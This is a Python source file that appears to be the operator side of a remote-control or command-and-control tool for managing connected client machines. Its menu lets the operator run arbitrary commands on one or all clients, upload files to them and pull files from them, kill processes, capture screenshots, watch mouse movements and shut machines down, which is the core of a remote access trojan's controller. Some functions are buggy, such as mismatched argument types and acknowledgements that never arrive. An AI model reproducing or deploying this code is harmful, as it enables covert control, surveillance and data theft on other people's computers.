#!/usr/bin/python3
import socket 
import threading
import concurrent.futures
import time
import os

import global_variables as gv
import broadcast_handler


def parse_command(command):

	if command == "help":
		show_help()
	elif command == "update_system_info":
		show_clients()
		update_system_info()
	elif command == "clients":
	 	show_clients()
	elif command == "sys_info":
		show_clients()
		client_id = get_client_id()
		request_client_info(gv.CLIENTS[client_id]['client'])
	elif command == "bc":
		broadcast_handler.bc_help_menu()
		broadcast_handler.interactive_bc_menu()
	elif command == "active_session":
		print('Active Session:' , gv.ACTIVE_SESSION)
		print('You can choose a client to interact with from list below')
		print('Or you can enter -1 to interact with all clients')
		show_clients()
		gv.ACTIVE_SESSION = get_client_id()
	elif command == "run":
		if(len(gv.CLIENTS) <= 0):
			print('No client avaiable')
			return
		print('command execution mode')
		user_input = ''	
		while True:
			user_input = input('\tEnter Command>')	
			if(user_input == 'END'):
				break
			if(str(bytes(user_input, 'utf-8')) == "b''"): 
				continue
			if (gv.ACTIVE_SESSION == -1):
				send_to_all(user_input)
			else:
				print(gv.ACTIVE_SESSION)
				send_to_client(gv.ACTIVE_SESSION, user_input)
	elif command == "upload":
		user_input = "b''"
		while(user_input == "b''"):
			user_input = input('\tSource path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
			if(not os.path.isfile(user_input)):
				print('File does not exist:', user_input)
				user_input = "b''"
				continue
			else:
				break
		src = user_input
		user_input = "b''"

		while(user_input == "b''"):
			user_input = input('\tDestination path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
		des = user_input
		client_id = get_client_id()
		send_to_client(client_id, '__up')
		print(src, des)
		send_file(client_id, src, des)

	elif command == "download":
		user_input = "b''"
		while(user_input == "b''"):
			user_input = input('\tSource path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
		src = user_input

		user_input = "b''"
		while(user_input == "b''"):
			user_input = input('\tDestination path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
		des = user_input
		
		client_id = get_client_id()
		send_to_client(client_id, '__down')
		print(src, des)
		get_file(client_id, src, des)

	elif command == "apps":
		show_clients()
		client_id = get_client_id()
		request_client_running_proccesses(gv.CLIENTS[client_id]['client'])

	elif command == "kill":
		user_input = "b''"
		while(user_input == "b''"):
			user_input = input('\tProcess name>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
		process_name = user_input
		show_clients()
		client_id = get_client_id()
		kill_client_process(gv.CLIENTS[client_id]['client'], process_name)

	elif command == "screenshot":
		show_clients()
		client_id = get_client_id()
		get_screenshot(gv.CLIENTS[client_id]['client'])

	elif command == "shutdown":
		show_clients()
		client_id = get_client_id()
		client = gv.CLIENTS[client_id]['client']
		print("shuting down client: ", client)
		my_bytes = bytes('shutdown','utf-8')
		client.send(my_bytes)

	elif command == "get_mouse":
		show_clients()
		client_id = get_client_id()
		client = gv.CLIENTS[client_id]['client']
		print("Getting mouse client: ", client)
		my_bytes = bytes('get_mouse','utf-8')
		client.send(my_bytes)
		print("waiting for cordinates...")
		output = client.recv(1024).decode('utf-8')
		print('\n', output)
		print('\n\n')
	elif command == "watch_mouse":
		user_input = get_user_input('For how long? ')
		show_clients()
		client_id = get_client_id()
		client = gv.CLIENTS[client_id]['client']
		print("Getting mouse client: ", client)
		for i in range(int(user_input)):
			time.sleep(1)
			my_bytes = bytes('get_mouse','utf-8')
			client.send(my_bytes)
			output = client.recv(1024).decode('utf-8')
			print(output)
		print('\n')
	elif command == "w10":
		show_clients()
		client_id = get_client_id()
		client = gv.CLIENTS[client_id]['client']
		for i in range(10):
			time.sleep(1)
			my_bytes = bytes('get_mouse','utf-8')
			client.send(my_bytes)
			output = client.recv(1024).decode('utf-8')
			print(output)
		print('\n')
	elif command == "w5":
		show_clients()
		client_id = get_client_id()
		client = gv.CLIENTS[client_id]['client']
		for i in range(5):
			time.sleep(1)
			my_bytes = bytes('get_mouse','utf-8')
			client.send(my_bytes)
			output = client.recv(1024).decode('utf-8')
			print(output)
		print('\n')
		
	
	else:
		print('Command not exist. use help to display help menu')
	print('')
def request_client_running_proccesses(client):
	my_bytes = bytes('running_applications','utf-8')
	client.send(my_bytes)
	output = client.recv(1024).decode('utf-8')
	print("Running Applictions result: \n", output)
	return output
def get_user_input(help_text):
	user_input = "b''"
	while(user_input == "b''"):
		user_input = input('\t{}>'.format(help_text))
		if(str(bytes(user_input, 'utf-8')) == "b''"): continue
	return user_input
def send_file(client_id, src, des):
	print('Sending file {} to {}'.format(src, client_id))
	with open(src, 'rb') as file:
		file_byte = file.read()
		length =  len(file_byte)
		print('Length is {}.'.format(length))
		client = gv.CLIENTS[client_id]['client']
		print("Sending Des")
		ack = send_to_client(client_id, des)
		if(ack != 'OK'):
			print("Problem on client. returning")
			return
		print("Sending Length")
		ack = send_to_client(client_id, length)
		if(ack != 'OK'):
			print("Problem on client. returning")
			return
		print("Sending File")
		client.send(file_byte)
	print('File has been sent successfully.')
def kill_client_process(client, process):
	print('Killing process {} of client'.format(process))
	my_bytes = bytes('kill_process','utf-8')
	client.send(my_bytes)

	my_bytes = bytes(process,'utf-8')
	client.send(my_bytes)
	output = client.recv(1024).decode('utf-8')
	print("client result:", output)
	return output
def get_screenshot(client):
	client.send(bytes('screenshot','utf-8'))
	print('Save screenshot from {}'.format(client))
	img_bytes = client.recv(1024)
	src = img_bytes.decode('utf-8')
	print("Screenshot captured and saved in remote computer: ", src)
def get_file(client_id, src, des):
	print('Downloading file {} from {}'.format(src, client_id))
	client = gv.CLIENTS[client_id]['client']
	# Send to check if exist
	client.send(bytes(src,'utf-8'))
	# Receive file size
	# -1 means file does not exist
	length = client.recv(16)
	length = int(length.decode('utf-8'))
	# perecent = length / 100
	if(length == -1):
		print('File does not exist')
		client.send(bytes("NOK",'utf-8'))
		return
	# Request for file
	print('send request for file with {}'.format(length))
	client.send(bytes("OK",'utf-8'))
	data = b''
	print('opening file')
	file = open(des, 'wb')
	print('receiving file')
	while len(data) < length:
		to_read = length - len(data)
		data += client.recv(
			4096 if to_read > 4096 else to_read)
	file.write(data)						
	print(str(file) , "Received")
	file.close()
def send_to_all(command):
	print('Active Session is -1. Sending to all clients')
	i = 0
	my_bytes = bytes(command, 'utf-8')
	remove_list = []
	for client in gv.CLIENTS:
		print('')
		try:
			client['client'].send(my_bytes)
		except:
			print('client %s disconnected. Addedto remove list.' % i)
			remove_list.append(gv.CLIENTS[i])
			continue
		output_bytes = client['client'].recv(32768)
		output = output_bytes.decode('utf-8')[8:]
		if(output == ''):
			print('client %s disconnected. Addedto remove list.' % i)
			remove_list.append(gv.CLIENTS[i])
		i = i + 1
		print(output)
		print('')
	print('')
	if (len(remove_list) > 0):
		print('Removing closed sessions...')
		for c in remove_list:
			gv.CLIENTS.remove(c)
		print('Active Session set to -1')
		gv.ACTIVE_SESSION = -1
def send_to_client(client_id, command):
	command = str(command)
	my_bytes = bytes(command, 'utf-8')
	print('Sending to client', client_id)
	if(client_id >= len(gv.CLIENTS)):
		print('Client does not exist. returning')
		print('')
		return
	active_client = gv.CLIENTS[client_id]['client']
	send_bytes_to_client(active_client, my_bytes);
	output = ''	
	print(output)
	return output

def send_bytes_to_client(client, bytes):
	client.send(bytes)
	check_dropped_connection(client);
	pass

def check_dropped_connection(client_id):
	client = gv.CLIENTS[client_id]['client']
	output_bytes = client.recv(1024)
	output = output_bytes.decode('utf-8')
	if(output == ''):
		print('client %s disconnected. Removing...' % client_id)
		gv.CLIENTS.remove(gv.CLIENTS[client_id])
		print('Active Session set to -1')
		gv.ACTIVE_SESSION = -1

def request_client_caption(client):
	my_bytes = bytes('caption','utf-8')
	client.send(my_bytes)
	output = client.recv(1024).decode('utf-8')
	print("caption:", output)
	return output
def request_client_info(client):
	my_bytes = bytes('sys_info','utf-8')
	client.send(my_bytes)
	output = client.recv(1024).decode('utf-8')
	print("sys_info result:", output)
	return output
def update_system_info():
	client_id = get_client_id()		
	gv.CLIENTS[client_id]['client_info'] = request_client_caption(gv.CLIENTS[client_id]['client'])
def get_client_id():
	client_id = input('\tEnter Client ID>')
	if(str(bytes(client_id, 'utf-8')) == "b''"): 
		print('returning')
		return

	clients_count = len(gv.CLIENTS)
	if int(client_id) > clients_count or int(client_id) < 0:
		print("ERROR: CLient does not exist.")
		return -1
	return int(client_id)
def show_clients():
	i = 0
	print('')
	print('List of Clients:')
	print('=====================================================')
	for client in gv.CLIENTS:
		print('ClientID:', i)
		print('Client Address:', client['address'])
		print('Client INFO:', client['client_info'])
		print('-----------------------------------------------------')
		i = i + 1
	print('')
def show_help():
	print("")
	print("Help Menu")
	print("----------------------------------------------------------")
	print("help \t\t - Show this menu")
	print("active_session \t - Set or get active sessions")
	print("clients \t - Display clients list")
	print("sys_info \t - Display system information of a client")
	print("update_sys_info \t - Update system information of a client")
	print("bc \t\t - Configure network broadcast massage")
	print("run \t\t - Execute command in client systems")
	print("upload \t\t - Upload file to a client system")
	print("download \t - Download file from a client system")
	print("apps \t\t - Display clients forground running applications")
	print("kill \t\t - Get clients process by name and stop that process")
	print("")
